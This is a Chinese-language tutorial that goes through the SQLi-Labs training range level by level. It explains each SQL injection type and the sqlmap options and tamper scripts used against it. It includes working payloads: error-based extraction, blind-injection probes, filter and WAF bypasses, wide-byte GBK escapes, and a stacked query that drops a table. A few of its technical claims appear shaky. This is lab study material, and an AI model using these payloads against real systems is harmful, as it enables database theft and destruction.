# SQL 注入类型详解

按 SQLi-Labs 关卡顺序，逐一分析每种注入类型的原理和 sqlmap 参数选择原因。

---

## 一、GET 基础注入 (Less 1-10)

### Less-1: 单引号字符型

```sql
-- 后端 SQL:
SELECT * FROM users WHERE id='$id' LIMIT 0,1

-- 注入 payload:
?id=1' UNION SELECT 1,2,3 -- -
-- sqlmap 自动完成以上过程
```

**关键参数：** 无需特殊参数，`--technique=U`（默认包含 UNION）。

sqlmap 会从 `'` 开始探测字符型闭合，然后自动尝试 UNION SELECT 确定列数。

### Less-2: 数字型

```sql
SELECT * FROM users WHERE id=$id LIMIT 0,1
```

数字型最简单：不需要引号闭合，直接 `?id=1 UNION SELECT ...`。

### Less-3: 单引号+括号

```sql
SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```

sqlmap 会自动尝试 `')` 前缀闭合括号。如果自动检测失败，可手动指定：
```bash
sqlmap -u "..." --prefix="')" --suffix="-- -"
```

### Less-4: 双引号+括号

```sql
SELECT * FROM users WHERE id=("$id") LIMIT 0,1
```

类似 Less-3，闭合方式变为 `")`。

### Less-5 / Less-6: 报错注入（双注入 / Double Injection）

```sql
-- Less-5
SELECT * FROM users WHERE id='$id' LIMIT 0,1

-- 报错注入 payload（利用 count(*) + floor(rand()*2) 产生主键重复）：
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
```

**为什么用 `--technique=E`：** 这两关无数据回显（页面只返回 "You are in..."），但有 MySQL 错误信息。报错注入通过触发数据库报错来泄露数据，比盲注快得多。

**sqlmap 探测过程：**
1. 先尝试 UNION（无回显 → 放弃）
2. 尝试布尔盲注（页面响应固定 → 放弃）
3. 尝试报错注入（看到 MySQL error → 成功）

### Less-7: 双层括号+文件导出

```sql
SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1
```

**难点：** sqlmap 自动检测时通常只尝试一层括号（`')`），无法识别双层括号 `'))`。需要手动指定：

```bash
--prefix="'))" --suffix="-- -"
```

**提示：** 如果 sqlmap 跑不出结果，先用手工确认闭合方式：`?id=1')) -- -` 应该正常返回。

### Less-8 / Less-9 / Less-10: 盲注

```sql
-- 无任何回显，无报错信息，只有两种页面状态：
-- 正确：返回 "You are in..........."
-- 错误：无输出
```

- **布尔盲注 (Less-8/10)**：通过页面 True/False 差异逐位推断数据。sqlmap 使用 `--technique=B`
- **时间盲注 (Less-9/10)**：通过 `SLEEP()` 造成延时来判断 True/False。sqlmap 使用 `--technique=T --time-sec=5`

**线程控制：** 时间盲注依赖网络延迟，多线程会互相干扰导致误判。所以 Less-9/10 使用 `--threads=3`。

---

## 二、POST/Header 注入 (Less 11-22)

### POST 参数注入 (Less 11-17)

```sql
-- 后端从 POST body 取参数
SELECT username, password FROM users WHERE username='$uname' AND password='$passwd'
```

使用 `--data=` 传递 POST 参数。sqlmap 会测试每个参数是否可注入。用 `-p` 指定参数可以缩小测试范围：
```bash
sqlmap -u "..." --data="uname=admin&passwd=admin" -p uname
```

### User-Agent / Referer 注入 (Less 18-19)

```sql
-- 后端将 User-Agent 写入数据库
INSERT INTO agents (user_agent, ip) VALUES ('$_SERVER[HTTP_USER_AGENT]', ...)
```

**关键：** 必须加 `--level=3`，sqlmap 默认（level 1-2）不测试 HTTP Header 参数。

```bash
--headers="User-Agent: test"  # 提供一个值让 sqlmap 识别到该参数
--level=3                     # 必须
```

### Cookie 注入 (Less 20-22)

```sql
SELECT * FROM users WHERE username='$_COOKIE[uname]'
```

**关键：** 至少需要 `--level=2` 才会测试 Cookie 参数。

Less-21/22 特殊点：Cookie 值是 Base64 编码的。需配合 `--tamper=base64encode`，sqlmap 会自动将 payload Base64 编码后再放入 Cookie。

---

## 三、WAF/过滤绕过 (Less 23-31)

### 注释过滤 (Less-23, 28)

```php
// 过滤了注释符：--, #
$id = preg_replace('/--|#/', '', $id);
```

**绕过：** 使用 `;%00`（空字节）截断，或使用 `--tamper=space2comment`（用 `/**/` 替代空格，同时闭合尾部）。

### 二次注入 (Less-24)

```
原理：
1. 注册用户名为 "admin' -- -" 的账号（存储在数据库）
2. 登录后修改密码时，UPDATE 语句取出存储的用户名，未再次转义
3. UPDATE users SET password='newpass' WHERE username='admin' -- -'
                                                ↑
                                              这里被截断，实际改了 admin 的密码
```

**sqlmap 局限性：** sqlmap 不直接支持二次注入检测。需要：
1. 先用 sqlmap 跑一次确认注入存在
2. 手工分两步利用：注册恶意用户名 → 触发 UPDATE

### OR/AND 过滤 (Less-25, 25a)

```php
$id = preg_replace('/or|and/i', '', $id);
```

用 `--tamper=space2comment` 即可绕过。例如 `AND` 变成 `/**/AND/**/`（实际上大多 WAF 对关键词检测不包含大小写变体或双写绕过 `ANANDD`）。

### 空格/注释过滤 (Less-26, 26a)

```php
// 过滤空格和注释
$id = preg_replace('/\s|--|#|\/\*/', '', $id);
```

使用 `--tamper=space2comment,randomcomments` 组合。
- `space2comment`：用 `/**/` 替代空格
- `randomcomments`：在关键字中随机插入注释（如 `SEL/**/ECT`）

### 关键字过滤 (Less-27, 27a)

```php
// 过滤 SELECT, UNION 等关键字
$id = preg_replace('/select|union|sleep/i', '', $id);
```

**绕过思路：** 大小写混写 `SeLeCt` — `--tamper=randomcase`。双写 `SELSELECTECT` 也可以。

### 双重参数 / HPP (Less-29-31)

```php
// WAF 检查第一个 id，后端取第二个 id
// URL: ?id=1&id=2
// WAF 看到 id=1 是安全的，但后端实际取 id=2
```

直接在 URL 中传入两个同名参数即可。sqlmap 的 HPP 支持有限，手工传入更可靠：
```bash
sqlmap -u "http://target.com/Less-29/?id=1&id=2"
```

---

## 四、宽字节注入 (Less 32-37)

### 原理

```
用户输入: 1'
addslashes 转义后: 1\'      （%27 → %5c%27）
宽字节注入输入: 1%df'
addslashes 转义后: 1%df%5c%27
GBK 解码后:      1運'         （%df%5c = 運 这个汉字）
结果：                      引号逃脱！
```

`%df` 是一个前导字节（lead byte，范围 0x81-0xFE），GBK 解码器会把 `%df%5c` 当成一个双字节汉字，"吃掉" 反斜杠。

### 转义函数差异

| 函数 | 是否受宽字节影响 |
|------|-----------------|
| `addslashes()` | 是 |
| `magic_quotes_gpc` (PHP 5.4- 已废弃) | 是 |
| `mysql_real_escape_string()` | 是（需连接未设置 charset） |
| `mysqli_real_escape_string()` + `set_charset('gbk')` | 是 |
| PDO + `set_charset('gbk')` + 未启用 `PDO::ATTR_EMULATE_PREPARES` | 否 |

### sqlmap 处理

`--tamper=unmagicquotes` 在每个引号前插入 `%df%27`（默认宽字节字符）。如果目标的 GBK 前导字节需要特定值（如 `%bf`），可以手动修改 sqlmap 的 tamper 脚本或自定义。

### Less-35 是数字型

宽字节绕过的核心是 "逃脱被转义的引号"，数字型 SQL 没有引号要逃脱，所以不需要 `--tamper=unmagicquotes`。

---

## 五、堆叠查询 (Less 38-45)

### 原理

```sql
-- 正常查询
SELECT * FROM users WHERE id='$id'

-- 堆叠注入
?id=1'; DROP TABLE users; -- -

-- 后端执行：
SELECT * FROM users WHERE id='1'; DROP TABLE users; -- '
```

### MySQL 中堆叠查询的可用性

| 连接方式 | 支持堆叠 |
|---------|---------|
| `mysql_query()` | 否（PHP 旧版默认） |
| `mysqli_query()` | 否 |
| `mysqli_multi_query()` | 是 |
| PDO + `PDO::ATTR_EMULATE_PREPARES` | 是 |
| CLI（命令行 mysql） | 是 |

PHP + MySQL 默认不支持堆叠查询。所以 SQLi-Labs 中的堆叠关卡实际上退化为普通注入（sqlmap 会找到并利用闭合方式）。

---

## 六、ORDER BY 注入 (Less 46-53)

### 特殊之处

注入点不在 WHERE 而在 ORDER BY：

```sql
SELECT * FROM users ORDER BY $sort
```

**限制：**
1. UNION SELECT 不适用（ORDER BY 在 UNION 之后执行，且 ORDER BY 后的值决定排序列）
2. 通常只能用报错注入或盲注

**sqlmap 行为：** sqlmap 在检测到 ORDER BY 注入点时，会提示 "it is not possible to use UNION technique" 并自动切换到盲注或报错注入。

### 盲注利用（Less 48, 49, 52, 53）

```sql
-- 无回显，页面只返回排序后的列表
-- 用布尔盲注判断：
?sort=(SELECT IF(SUBSTRING(database(),1,1)='s', 1, 2))
-- 如果 database() 首字母是 's'，按第1列排序；否则按第2列 → 观察排序结果变化
```

---

## 七、挑战关卡 (Less 54-65)

### 挑战规则
- 表名随机生成（如 `5u3x9k`）
- 每次 Setup 重置数据库都会换新表名
- 限制 10 次 GET/POST 请求

### sqlmap 策略

```bash
# 错误做法（浪费请求次数）：
sqlmap -u "..." --dump  # 会先枚举 DB→表→列→dump，请求数超限

# 正确做法：
# 步骤1：枚举数据库名和表名（少量请求）
sqlmap -u "..." --dbs --tables --threads=5 --technique=E

# 步骤2：用枚举到的真实表名 dump（精确请求）
sqlmap -u "..." -D security -T kv3m9s -C secret_key --dump
```

盲注关（Less 62-65）需要在 10 次请求内猜出随机表名，时间盲注理论上不可行（一个字符就需要多次延时请求）。推荐用布尔盲注 `--technique=B`。

### 如果请求次数耗尽

回到首页点击 "Setup/reset Database for labs" 重置。

---

> 参考：[sqlmap 完整手册](sqlmap.md) | [靶场总览](overview.md) | [搭建指南](setup-guide.md)
